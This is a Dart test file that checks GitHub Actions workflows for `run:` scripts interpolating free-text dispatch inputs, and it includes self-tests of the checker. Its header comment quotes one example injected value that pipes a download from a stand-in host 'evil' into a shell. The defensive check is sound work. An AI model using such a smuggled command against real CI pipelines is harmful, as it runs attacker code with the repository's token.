// A `run:` script must not interpolate a free-text `workflow_dispatch` input.
//
// `${{ inputs.x }}` is substituted into the script text before the shell sees
// it, so a value such as `https://x"; curl evil | sh #` becomes code that runs
// with the job's token and caches. Whoever can dispatch has write access, but
// on a repository whose `main` is protected that is still more than they
// should get. Pass the input through `env:` and read `"$X"` instead: an
// environment variable is data. A `choice`, `boolean` or `number` input is
// constrained by GitHub before the run starts, so interpolating it is safe.

import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:yaml/yaml.dart';

const _constrainedTypes = {'choice', 'boolean', 'number'};

final RegExp _inputRef = RegExp(
  r'\$\{\{\s*(?:inputs|github\.event\.inputs)\.([\w-]+)\s*\}\}',
);

/// `file:line: input` for each free-text dispatch input that a `run:` script
/// in [source] interpolates.
List<String> interpolatedFreeTextInputs(String path, String source) {
  final root = loadYamlNode(source) as YamlMap;
  final on = root['on'];
  final dispatch = on is YamlMap ? on['workflow_dispatch'] : null;
  final inputs = dispatch is YamlMap ? dispatch['inputs'] : null;
  if (inputs is! YamlMap) return const [];
  final freeText = {
    for (final MapEntry(:key, :value) in inputs.entries)
      if (!_constrainedTypes.contains(value is YamlMap ? value['type'] : null))
        '$key',
  };

  final found = <String>[];
  void walk(YamlNode node) {
    if (node is YamlMap) {
      for (final MapEntry(:key, :value) in node.nodes.entries) {
        if (key is YamlScalar &&
            key.value == 'run' &&
            value is YamlScalar &&
            value.value is String) {
          for (final m in _inputRef.allMatches(value.value as String)) {
            if (freeText.contains(m.group(1))) {
              found.add('$path:${value.span.start.line + 1}: ${m.group(1)}');
            }
          }
        } else {
          walk(value);
        }
      }
    } else if (node is YamlList) {
      node.nodes.forEach(walk);
    }
  }

  walk(root);
  return found;
}

void main() {
  test('no run: script interpolates a free-text dispatch input', () {
    final workflows = Directory('.github/workflows')
        .listSync()
        .whereType<File>()
        .where((f) => f.path.endsWith('.yml') || f.path.endsWith('.yaml'));
    expect(
      [
        for (final f in workflows)
          ...interpolatedFreeTextInputs(f.path, f.readAsStringSync()),
      ],
      isEmpty,
      reason:
          r'Pass the input through env: (X: ${{ inputs.x }}) and read "$X" '
          'in the script.',
    );
  });

  group('the check itself', () {
    const workflow = r'''
on:
  workflow_dispatch:
    inputs:
      url:
        type: string
      text: {}
      env:
        type: choice
        options: [a, b]
jobs:
  a:
    steps:
      - run: echo "${{ inputs.url }} ${{ github.event.inputs.text }}"
      - run: echo "${{ inputs.env }}"
      - env:
          URL: ${{ inputs.url }}
        run: echo "$URL"
''';

    test('reports string and untyped inputs inside run:', () {
      expect(interpolatedFreeTextInputs('w.yml', workflow), [
        'w.yml:13: url',
        'w.yml:13: text',
      ]);
    });

    test('ignores a workflow without dispatch inputs', () {
      expect(
        interpolatedFreeTextInputs('w.yml', 'on: push\njobs: {}\n'),
        isEmpty,
      );
    });
  });
}
